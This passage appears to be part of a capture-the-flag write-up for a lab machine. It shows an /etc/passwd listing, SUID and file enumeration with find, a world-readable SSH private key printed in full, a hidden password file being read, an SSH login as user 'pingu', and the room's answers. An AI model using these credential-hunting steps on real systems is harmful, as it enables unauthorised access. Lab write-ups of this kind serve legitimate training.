+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+uuidd:x:107:111::/run/uuidd:/bin/false
+papa:x:1000:1000:qaa:/home/papa:/bin/bash
+mysql:x:108:116:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
+pingu:x:1002:1002::/home/pingu:/bin/bash
+
+www-data@ubuntu:/var/www/html$ find / -perm -4000 2>/dev/null | xargs ls -lah
+find / -perm -4000 2>/dev/null | xargs ls -lah
+-rwsr-xr-x 1 root root        31K Jul 12  2016 /bin/fusermount
+-rwsr-xr-x 1 root root        40K May 16  2018 /bin/mount
+-rwsr-xr-x 1 root root       139K Jan 28  2017 /bin/ntfs-3g
+-rwsr-xr-x 1 root root        44K May  7  2014 /bin/ping
+-rwsr-xr-x 1 root root        44K May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root root        40K May 16  2017 /bin/su
+-rwsr-xr-x 1 root root        27K May 16  2018 /bin/umount
+-r-sr-xr-x 1 root papa       7.4K Jan 16  2020 /opt/secret/root
+-rwsr-xr-x 1 root root        49K May 16  2017 /usr/bin/chfn
+-rwsr-xr-x 1 root root        40K May 16  2017 /usr/bin/chsh
+-rwsr-xr-x 1 root root        74K May 16  2017 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root        39K May 16  2017 /usr/bin/newgrp
+-rwsr-xr-x 1 root root        53K May 16  2017 /usr/bin/passwd
+-rwsr-xr-x 1 root root       134K Jul  4  2017 /usr/bin/sudo
+-rwsr-xr-x 1 root root        11K May  8  2018 /usr/bin/vmware-user-suid-wrapper
+-rwsr-xr-- 1 root messagebus  42K Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root        10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root       419K Mar  4  2019 /usr/lib/openssh/ssh-keysign
+
+`�/     ywww-find / -user pingu 2>/dev/null | xargs ls -lah
+find / -user pingu 2>/dev/null | xargs ls -lah
+lrwxrwxrwx 1 pingu pingu    9 Jan 20  2020 /home/pingu/.bash_history -> /dev/null
+-rwxrwxrwx 1 pingu pingu    0 Jan 15  2020 /home/pingu/.cache/motd.legal-displayed
+-rw------- 1 pingu pingu 1.9K Jan 20  2020 /home/pingu/.gdb_history
+-rwxrwxrwx 1 pingu pingu    0 Jan 15  2020 /home/pingu/.pwntools-cache-2.7/update
+-rwxrwxrwx 1 pingu pingu 1.7K Jan 15  2020 /home/pingu/.ssh/id_rsa
+-rwxrwxrwx 1 pingu pingu  394 Jan 15  2020 /home/pingu/.ssh/id_rsa.pub
+
+/home/pingu:
+total 32K
+drwxrwxrwx 6 pingu pingu 4.0K Jan 20  2020 .
+drwxr-xr-x 4 root  root  4.0K Jan 15  2020 ..
+lrwxrwxrwx 1 pingu pingu    9 Jan 20  2020 .bash_history -> /dev/null
+drwxrwxrwx 2 pingu pingu 4.0K Jan 15  2020 .cache
+-rw------- 1 pingu pingu 1.9K Jan 20  2020 .gdb_history
+-rw-r--r-- 1 root  root    36 Jan 16  2020 .gdbinit
+drwxrwxrwx 2 pingu pingu 4.0K Jan 15  2020 .nano
+drwxrwxrwx 2 pingu pingu 4.0K Jan 15  2020 .pwntools-cache-2.7
+drwxrwxrwx 2 pingu pingu 4.0K Jan 15  2020 .ssh
+
+/home/pingu/.cache:
+total 8.0K
+drwxrwxrwx 2 pingu pingu 4.0K Jan 15  2020 .
+drwxrwxrwx 6 pingu pingu 4.0K Jan 20  2020 ..
+-rwxrwxrwx 1 pingu pingu    0 Jan 15  2020 motd.legal-displayed
+
+/home/pingu/.nano:
+total 8.0K
+drwxrwxrwx 2 pingu pingu 4.0K Jan 15  2020 .
+drwxrwxrwx 6 pingu pingu 4.0K Jan 20  2020 ..
+
+/home/pingu/.pwntools-cache-2.7:
+total 8.0K
+drwxrwxrwx 2 pingu pingu 4.0K Jan 15  2020 .
+drwxrwxrwx 6 pingu pingu 4.0K Jan 20  2020 ..
+-rwxrwxrwx 1 pingu pingu    0 Jan 15  2020 update
+
+/home/pingu/.ssh:
+total 16K
+drwxrwxrwx 2 pingu pingu 4.0K Jan 15  2020 .
+drwxrwxrwx 6 pingu pingu 4.0K Jan 20  2020 ..
+-rwxrwxrwx 1 pingu pingu 1.7K Jan 15  2020 id_rsa
+-rwxrwxrwx 1 pingu pingu  394 Jan 15  2020 id_rsa.pub
+
+www-data@ubuntu:/home/pingu/.ssh$ cat id_rsa
+cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEArfwVtcBusqBrJ02SfHLEcpbFcrxUVFezLYEUUFTHRnTwUnsU
+aHa3onWWNQKVoOwtr3iaqsandQoNDAaUNocbxnNoJaIAg40G2FEI49wW1Xc9porU
+x8haIBCI3LSjBd7GDhyh4T6+o5K8jDfXmNElyp7d5CqPRQHNcSi8lw9pvFqaxUuB
+ZYD7XeIR8i08IdivdH2hHaFR32u3hWqcQNWpmyYx4JhdYRdgdlc6U02ahCYhyvYe
+LKIgaqWxUjkOOXRyTBXen/A+J9cnwuM3Njx+QhDo6sV7PDBIMx+4SBZ2nKHKFjzY
+y2RxhNkZGvL0N14g3udz/qLQFWPICOw218ybaQIDAQABAoIBAClvd9wpUDPKcLqT
+hueMjaycq7l/kLXljQ6xRx06k5r8DqAWH+4hF+rhBjzpuKjylo7LskoptYfyNNlA
+V9wEoWDJ62vLAURTOeYapntd1zJPi6c2OSa7WHt6dJ3bh1fGjnSd7Q+v2ccrEyxx
+wC7s4Is4+q90U1qj60Gf6gov6YapyLHM/yolmZlXunwI3dasEh0uWFd91pAkVwTb
+FtzCVthL+KXhB0PSQZQJlkxaOGQ7CDT+bAE43g/Yzl309UQSRLGRxIcEBHRZhTRS
+M+jykCBRDJaYmu+hRAuowjRfBYg2xqvAZU9W8ZIkfNjoVE2i+KwVwxITjFZkkqMI
+jgL0oAECgYEA3339Ynxj2SE5OfD4JRfCRHpeQOjVzm+6/8IWwHJXr7wl/j49s/Yw
+3iemlwJA7XwtDVwxkxvsfHjJ0KvTrh+mjIyfhbyj9HjUCw+E3WZkUMhqefyBJD1v
+tTxWWgw3DKaXHqePmu+srUGiVRIua4opyWxuOv0j0g3G17HhlYKL94ECgYEAx0qf
+ltrdTUrwr8qRLAqUw8n1jxXbr0uPAmeS6XSXHDTE4It+yu3T606jWNIGblX9Vk1U
+mcRk0uhuFIAG2RBdTXnP/4SNUD0FDgo+EXX8xNmMgOm4cJQBdxDRzQa16zhdnZ0C
+xrg4V5lSmZA6R38HXNeqcSsdIdHM0LlE31cL1+kCgYBTtLqMgo5bKqhmXSxzqBxo
+zXQz14EM2qgtVqJy3eCdv1hzixhNKO5QpoUslfl/eTzefiNLN/AxBoSAFXspAk28
+4oZ07pxx2jeBFQTsb4cvAoFuwvYTfrcyKDEndN/Bazu6jYOpwg7orWaBelfMi2jv
+Oh9nFJyv9dz9uHAHMWf/AQKBgFh/DKsCeW8PLh4Bx8FU2Yavsfld7XXECbc5owVE
+Hq4JyLsldqJKReahvut8KBrq2FpwcHbvvQ3i5K75wxC0sZnr069VfyL4VbxMVA+Q
+4zPOnxPHtX1YW+Yxc9ileDcBiqCozkjMGUjc7s7+OsLw56YUpr0mNgOElHzDKJA8
+qSexAoGAD4je4calnfcBFzKYkLqW3nfGIuC/4oCscYyhsmSySz5MeLpgx2OV9jpy
+t2T6oJZYnYYwiZVTZWoEwKxUnwX/ZN73RRq/mBX7pbwOBBoINejrMPiA1FRo/AY3
+pOq0JjdnM+KJtB4ae8UazL0cSJ52GYbsNABrcGEZg6m5pDJD3MM=
+-----END RSA PRIVATE KEY-----
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ nano penguin_rsa
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ chmod 600 penguin_rsa
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ ssh -i penguin_rsa pingu@10.10.181.221
+The authenticity of host '10.10.181.221 (10.10.181.221)' can't be established.
+ED25519 key fingerprint is SHA256:+hK0Xg1iyvZJUoO07v4g1UZ11QpuwY05deZS4BPEbbE.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.181.221' (ED25519) to the list of known hosts.
+pingu@10.10.181.221's password: 
+Permission denied, please try again.
+
+need a pass so let's find it
+
+www-data@ubuntu:/home/pingu/.ssh$ find / -name pass* 2>/dev/null
+find / -name pass* 2>/dev/null
+/usr/bin/passwd
+/usr/lib/grub/i386-pc/password.mod
+/usr/lib/grub/i386-pc/password_pbkdf2.mod
+/usr/lib/tmpfiles.d/passwd.conf
+/usr/share/help-langpack/en_GB/evince/password.page
+/usr/share/help-langpack/en_GB/zenity/password.page
+/usr/share/bash-completion/completions/passwd
+/usr/share/base-passwd/passwd.master
+/usr/share/doc/passwd
+/usr/share/doc/passwd/examples/passwd.expire.cron
+/usr/share/lintian/overrides/passwd
+/usr/share/man/ko/man5/passwd.5.gz
+/usr/share/man/man1/passwd.1ssl.gz
+/usr/share/man/man1/passwd.1.gz
+/usr/share/man/fr/man1/passwd.1.gz
+/usr/share/man/fr/man5/passwd.5.gz
+/usr/share/man/man3/passwd2des.3.gz
+/usr/share/man/cs/man5/passwd.5.gz
+/usr/share/man/de/man1/passwd.1.gz
+/usr/share/man/de/man5/passwd.5.gz
+/usr/share/man/it/man1/passwd.1.gz
+/usr/share/man/it/man5/passwd.5.gz
+/usr/share/man/ru/man1/passwd.1.gz
+/usr/share/man/ru/man5/passwd.5.gz
+/usr/share/man/hu/man1/passwd.1.gz
+/usr/share/man/hu/man5/passwd.5.gz
+/usr/share/man/pt_BR/man5/passwd.5.gz
+/usr/share/man/ja/man1/passwd.1.gz
+/usr/share/man/ja/man5/passwd.5.gz
+/usr/share/man/sv/man1/passwd.1.gz
+/usr/share/man/sv/man5/passwd.5.gz
+/usr/share/man/tr/man1/passwd.1.gz
+/usr/share/man/tr/man5/passwd.5.gz
+/usr/share/man/zh_CN/man1/passwd.1.gz
+/usr/share/man/zh_CN/man5/passwd.5.gz
+/usr/share/man/man5/passwd.5.gz
+/usr/share/man/zh_TW/man5/passwd.5.gz
+/usr/share/icons/Humanity/apps/48/password.svg
+/usr/share/icons/Humanity/apps/24/password.png
+/etc/pam.d/passwd
+/etc/init/passwd.conf
+/etc/passwd
+/etc/passwd-
+/etc/cron.daily/passwd
+/var/cache/debconf/passwords.dat
+/var/hidden/pass
+/var/lib/dpkg/info/passwd.postinst
+/var/lib/dpkg/info/passwd.list
+/var/lib/dpkg/info/passwd.md5sums
+/var/lib/dpkg/info/passwd.postrm
+/var/lib/dpkg/info/passwd.preinst
+/var/lib/dpkg/info/passwd.conffiles
+/var/lib/pam/password
+/boot/grub/i386-pc/password.mod
+/boot/grub/i386-pc/password_pbkdf2.mod
+
+www-data@ubuntu:/home/pingu/.ssh$ cd /var/hidden
+cd /var/hidden
+www-data@ubuntu:/var/hidden$ ls
+ls
+pass
+www-data@ubuntu:/var/hidden$ cat pass
+cat pass
+pinguapingu
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ ssh -i penguin_rsa pingu@10.10.181.221
+pingu@10.10.181.221's password: pinguapingu
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+Last login: Mon Jan 20 14:14:47 2020
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+pingu@ubuntu:~$ whoami
+pingu
+
+:)
+```
+How many files are in the current directory?
+*3*
+Do I still have an account
+Check /etc/passwd
+*yes*
+What is my ssh password?
+*pinguapingu*
+
+## Notes / Lessons Learned
+[[Neighbour]]
+
